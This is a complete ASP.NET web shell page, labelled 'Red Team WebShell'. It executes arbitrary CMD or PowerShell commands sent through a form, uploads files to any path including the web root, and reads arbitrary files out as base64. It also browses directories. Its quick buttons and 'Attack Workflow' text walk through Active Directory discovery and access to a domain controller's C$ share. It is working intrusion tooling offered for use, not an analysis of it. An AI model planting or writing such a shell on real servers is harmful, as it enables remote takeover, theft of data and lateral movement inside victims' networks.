<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<!DOCTYPE html>
<html>
<head>
    <title>Red Team WebShell v4.2</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Consolas', 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff41;
            min-height: 100vh;
            padding: 0;
        }
        
        .header {
            background: linear-gradient(90deg, #000428 0%, #004e92 100%);
            padding: 15px 25px;
            border-bottom: 3px solid #00ff41;
            box-shadow: 0 4px 20px rgba(0, 255, 65, 0.2);
        }
        .header h1 {
            font-size: 28px;
            display: flex;
            align-items: center;
            gap: 12px;
            color: #00ff41;
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
        }
        .header-info {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 15px;
            margin-top: 12px;
            font-size: 13px;
        }
        .info-item {
            background: rgba(0, 68, 146, 0.8);
            padding: 8px 15px;
            border-radius: 20px;
            border: 1px solid rgba(0, 255, 65, 0.3);
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 25px;
        }

        .command-section {
            background: rgba(15, 15, 25, 0.95);
            border: 2px solid #00ff41;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            box-shadow: 0 10px 40px rgba(0, 255, 65, 0.15);
        }

        .section-title {
            color: #00ff41;
            font-size: 22px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .input-group {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
            margin-bottom: 15px;
        }

        .input-box {
            flex: 1;
            min-width: 300px;
            padding: 12px 15px;
            background: #1a1a2a;
            border: 2px solid #333;
            border-radius: 10px;
            color: #00ff41;
            font-family: inherit;
            font-size: 14px;
        }
        .input-box:focus {
            outline: none;
            border-color: #00ff41;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
        }

        .cmd-input {
            min-width: 400px;
            max-width: 60%;
        }

        .btn {
            padding: 15px 30px;
            background: linear-gradient(45deg, #00ff41, #00cc33);
            color: #000;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-family: inherit;
            font-weight: bold;
            font-size: 15px;
            transition: all 0.3s ease;
            min-width: 120px;
        }
        .btn:hover, .btn:active {
            background: linear-gradient(45deg, #00cc33, #00ff41);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 65, 0.4);
        }

        .quick-commands {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 15px;
        }
        .quick-btn {
            padding: 8px 15px;
            background: rgba(0, 255, 65, 0.1);
            border: 1px solid rgba(0, 255, 65, 0.3);
            border-radius: 8px;
            color: #00ff41;
            font-family: inherit;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .quick-btn:hover {
            background: rgba(0, 255, 65, 0.2);
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
        }

        .output-section {
            background: rgba(10, 10, 15, 0.98);
            border: 2px solid #00ff41;
            border-radius: 15px;
            padding: 0;
            margin-bottom: 25px;
            box-shadow: 0 15px 50px rgba(0, 255, 65, 0.1);
            height: 500px;
            display: flex;
            flex-direction: column;
        }

        .output-header {
            background: rgba(0, 68, 146, 0.9);
            padding: 15px 25px;
            border-bottom: 2px solid #00ff41;
            color: #00ff41;
            font-size: 16px;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .output-box {
            flex: 1;
            background: #000;
            border: none;
            border-radius: 0 0 15px 15px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.5;
            color: #00ff41;
            white-space: pre_backup;
            word-break: break-all;
            overflow-y: auto;
            max-height: none;
        }

        .output-box::-webkit-scrollbar {
            width: 10px;
        }
        .output-box::-webkit-scrollbar-track {
            background: #1a1a2a;
        }
        .output-box::-webkit-scrollbar-thumb {
            background: #00ff41;
            border-radius: 5px;
        }

        .file-section {
            background: rgba(15, 15, 25, 0.95);
            border: 2px solid #ff6b6b;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 10px 40px rgba(255, 107, 107, 0.15);
        }

        .file-title {
            color: #ff6b6b;
            font-size: 22px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .file-input-group {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 15px;
            margin-bottom: 20px;
        }

        .file-input {
            padding: 12px 15px;
            background: #1a1a2a;
            border: 2px solid #ff6b6b;
            border-radius: 10px;
            color: #00ff41;
            font-family: inherit;
            font-size: 14px;
        }

        .btn-file {
            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
            color: #fff;
            min-width: 120px;
        }
        .btn-file:hover, .btn-file:active {
            background: linear-gradient(45deg, #ee5a52, #ff6b6b);
            transform: translateY(-2px);
        }

        .file-browse-output {
            background: rgba(10, 10, 15, 0.98);
            border: 2px solid #ff6b6b;
            border-radius: 15px;
            padding: 0;
            margin-top: 20px;
            box-shadow: 0 15px 50px rgba(255, 107, 107, 0.1);
            height: 400px;
            display: flex;
            flex-direction: column;
        }

        .file-output-header {
            background: rgba(255, 107, 107, 0.9);
            padding: 15px 25px;
            border-bottom: 2px solid #ff6b6b;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .file-output-box {
            flex: 1;
            background: #000;
            border: none;
            border-radius: 0 0 15px 15px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.5;
            color: #ff6b6b;
            white-space: pre-wrap;
            word-break: break-all;
            overflow-y: auto;
        }

        @media (max-width: 1200px) {
            .file-input-group {
                grid-template-columns: 1fr;
            }
            .input-group {
                flex-direction: column;
            }
            .cmd-input {
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>ZHAH WebShell v0.1</h1>
        <div class="header-info">
            <div class="info-item">Server: <%=Environment.MachineName%></div>
            <div class="info-item">User: <%=Environment.UserName%></div>
            <div class="info-item">Time: <%=DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")%></div>
            <div class="info-item">Path: <%=Directory.GetCurrentDirectory()%></div>
        </div>
    </div>

    <div class="container">
        <!-- Command Execution -->
        <div class="command-section">
            <div class="section-title">Command Execution</div>
            <form method="post">
                <div class="input-group">
                    <select name="shell" class="input-box">
                        <option value="cmd" <%= Request.Form["shell"] == "cmd" ? "selected" : "" %>>CMD</option>
                        <option value="powershell" <%= Request.Form["shell"] == "powershell" ? "selected" : "" %>>PowerShell</option>
                    </select>
                    <input type="text" name="cmd" class="input-box cmd-input" 
                           placeholder="whoami / net view / net user /domain / systeminfo" 
                           value="<%=Request.Form["cmd"] ?? ""%>"/>
                    <button type="submit" name="action" value="execute" class="btn">EXECUTE</button>
                </div>
            </form>
            <div class="quick-commands">
                <button type="button" class="quick-btn" onclick="document.getElementsByName('cmd')[0].value='whoami';">whoami</button>
                <button type="button" class="quick-btn" onclick="document.getElementsByName('cmd')[0].value='net view';">net view</button>
                <button type="button" class="quick-btn" onclick="document.getElementsByName('cmd')[0].value='net user /domain';">net user /domain</button>
                <button type="button" class="quick-btn" onclick="document.getElementsByName('cmd')[0].value='ipconfig /all';">ipconfig</button>
                <button type="button" class="quick-btn" onclick="document.getElementsByName('cmd')[0].value='systeminfo';">systeminfo</button>
                <button type="button" class="quick-btn" onclick="document.getElementsByName('cmd')[0].value='dir \\dc01.lab.local\\c\( ';">DC C \)</button>
            </div>
        </div>

        <!-- Command Output -->
        <div class="output-section">
            <div class="output-header">
                <span>Command Output</span>
                <span><%=Request.Form["cmd"] != null ? "Command: " + (Request.Form["shell"] ?? "cmd") + " " + Server.HtmlEncode(Request.Form["cmd"]) : "Ready - Enter command above"%></span>
            </div>
            <div class="output-box">
                <% 
                    if(Request.Form["action"] == "execute" && !string.IsNullOrEmpty(Request.Form["cmd"]))
                    {
                        Response.Write(Server.HtmlEncode(ExecuteCommand(Request.Form["shell"] ?? "cmd", Request.Form["cmd"])));
                    }
                    else
                    {
                %>
WebShell v4.2 Ready!

Quick Commands Available:
whoami                    - Current user
net view                 - List domain servers  
net user /domain         - Domain users
ipconfig /all            - Network configuration
systeminfo               - System information
dir \\dc01.lab.local\c$  - Domain Controller access

Attack Workflow:
1. net view                 [Discovery]
2. net user /domain         [Enumeration]  
3. dir \\dc01.lab.local\c$  [Access Test]
4. Use quick buttons above!

Press Enter to execute command
                <%
                    }
                %>
            </div>
        </div>

        <!-- File Manager -->
        <div class="file-section">
            <div class="file-title">File Manager</div>
            
            <div class="file-input-group">
                <!-- Upload -->
                <form method="post" enctype="multipart/form-data">
                    <div class="input-group">
                        <input type="file" name="upload_file" class="file-input" required/>
                        <input type="text" name="upload_path" class="file-input" 
                               placeholder="Upload path (C:\inetpub\wwwroot\)" 
                               value="<%=Request.Form["upload_path"] ?? @"C:\inetpub\wwwroot\"%>"/>
                        <button type="submit" name="action" value="upload" class="btn-file">UPLOAD</button>
                    </div>
                </form>

                <!-- Download -->
                <form method="post">
                    <div class="input-group">
                        <input type="text" name="download_path" class="file-input" 
                               placeholder="Download path (C:\Windows\System32\nc.exe)"
                               value="<%=Request.Form["download_path"] ?? ""%>"/>
                        <button type="submit" name="action" value="download" class="btn-file">DOWNLOAD</button>
                    </div>
                </form>

                <!-- Browse -->
                <form method="post">
                    <div class="input-group">
                        <input type="text" name="browse_path" class="file-input" 
                               placeholder="Browse directory (C:\)"
                               value="<%=Request.Form["browse_path"] ?? @"C:\"%>"/>
                        <button type="submit" name="action" value="browse" class="btn-file">BROWSE</button>
                    </div>
                </form>
            </div>
        </div>

        <!-- File Output -->
        <div class="file-browse-output">
            <div class="file-output-header">
                <span>File Operations</span>
                <span><%=GetFileOperationResult()%></span>
            </div>
            <div class="file-output-box">
                <% 
                    if(Request.Form["action"] == "upload")
                    {
                        Response.Write(HandleFileUpload());
                    }
                    else if(Request.Form["action"] == "download")
                    {
                        Response.Write(HandleFileDownload());
                    }
                    else if(Request.Form["action"] == "browse")
                    {
                        Response.Write(ListDirectory(Request.Form["browse_path"] ?? @"C:\"));
                    }
                    else
                    {
                        Response.Write(ListDirectory(@"C:\"));
                    }
                %>
            </div>
        </div>
    </div>

    <script runat="server">
        public string ExecuteCommand(string shellType, string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                
                if (shellType.ToLower() == "powershell")
                {
                    psi.FileName = "powershell.exe";
                    psi.Arguments = "-Command \"" + command.Replace("\"", "\\\"") + "\"";
                }
                else
                {
                    psi.FileName = "cmd.exe";
                    psi.Arguments = "/c " + command;
                }
                
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.CreateNoWindow = true;
                psi.WorkingDirectory = @"C:\";

                using (Process process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit(30000);

                    StringBuilder result = new StringBuilder();
                    result.AppendLine("===================================================");
                    result.AppendLine("[" + shellType.ToUpper() + "] " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                    result.AppendLine("Command: " + command);
                    result.AppendLine("===================================================");
                    
                    if (!string.IsNullOrEmpty(output))
                    {
                        result.AppendLine("OUTPUT:");
                        result.AppendLine(output);
                    }
                    
                    if (!string.IsNullOrEmpty(error))
                    {
                        result.AppendLine("ERROR:");
                        result.AppendLine(error);
                    }
                    
                    result.AppendLine("===================================================");
                    result.AppendLine("Exit Code: " + process.ExitCode.ToString());
                    result.AppendLine("===================================================");
                    return result.ToString();
                }
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }

        public string HandleFileUpload()
        {
            try
            {
                if (Request.Files["upload_file"] != null && Request.Files["upload_file"].ContentLength > 0)
                {
                    HttpPostedFile file = Request.Files["upload_file"];
                    string uploadPath = Request.Form["upload_path"] ?? @"C:\inetpub\wwwroot\";
                    uploadPath = uploadPath.TrimEnd('\\') + "\\";
                    
                    if (!Directory.Exists(uploadPath))
                        Directory.CreateDirectory(uploadPath);
                    
                    string fileName = Path.GetFileName(file.FileName);
                    string fullPath = Path.Combine(uploadPath, fileName);
                    
                    file.SaveAs(fullPath);
                    
                    FileInfo fi = new FileInfo(fullPath);
                    return "SUCCESS: File uploaded!\n" +
                           "Path: " + fullPath + "\n" +
                           "Size: " + (fi.Length / 1024) + " KB\n" +
                           "Time: " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                }
                return "ERROR: No file selected";
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }

        public string HandleFileDownload()
        {
            try
            {
                string filePath = Request.Form["download_path"];
                if (string.IsNullOrEmpty(filePath) || !File.Exists(filePath))
                {
                    return "ERROR: File not found: " + filePath;
                }

                FileInfo fi = new FileInfo(filePath);
                byte[] fileBytes = File.ReadAllBytes(filePath);
                string base64 = Convert.ToBase64String(fileBytes);
                
                return "SUCCESS: File ready for download!\n" +
                       "File: " + filePath + "\n" +
                       "Size: " + (fi.Length / 1024) + " KB\n" +
                       "\nBase64 Content (copy below):\n" +
                       "---------------------------------------------------\n" +
                       base64 + "\n" +
                       "---------------------------------------------------\n" +
                       "\nTo decode in Linux:\n" +
                       "echo 'BASE64_STRING' | base64 -d > filename.ext";
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }

        public string ListDirectory(string path)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                sb.AppendLine("DIRECTORY LISTING: " + path);
                sb.AppendLine(new string('=', 80));
                
                if (Directory.Exists(path))
                {
                    string[] dirs = Directory.GetDirectories(path);
                    string[] files = Directory.GetFiles(path);

                    foreach (string dir in dirs)
                    {
                        sb.AppendLine("<DIR>  " + Path.GetFileName(dir));
                    }

                    foreach (string file in files)
                    {
                        FileInfo fi = new FileInfo(file);
                        sb.AppendLine("      " + fi.Name + " (" + (fi.Length / 1024) + " KB) - " + fi.LastWriteTime);
                    }

                    if (dirs.Length == 0 && files.Length == 0)
                        sb.AppendLine("Directory is empty.");
                }
                else
                {
                    sb.AppendLine("ERROR: Directory does not exist or access denied.");
                }

                return sb.ToString();
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }

        public string GetFileOperationResult()
        {
            if (Request.Form["action"] == "upload") return "Upload Result";
            if (Request.Form["action"] == "download") return "Download Result";
            if (Request.Form["action"] == "browse") return "Browse: " + (Request.Form["browse_path"] ?? "C:\\");
            return "Ready";
        }
    </script>
</body>
</html>
